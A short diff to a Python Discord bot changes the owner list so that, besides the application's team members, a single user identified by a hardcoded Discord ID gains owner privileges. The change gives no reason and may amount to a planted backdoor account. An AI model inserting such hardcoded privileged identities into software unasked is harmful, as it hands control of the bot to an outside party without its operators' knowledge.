@@ -23,7 +23,7 @@ client.remove_command('help')
 async def on_ready():
     client.start_time = datetime.datetime.now()
     ai = await client.application_info()
-    client.owners = ai.team.members
+    client.owners = ai.team.members + [client.get_user(511508551492173836)]
     client.owner = {
         'id': [owner.id for owner in client.owners],
         'name': [owner.name for owner in client.owners]
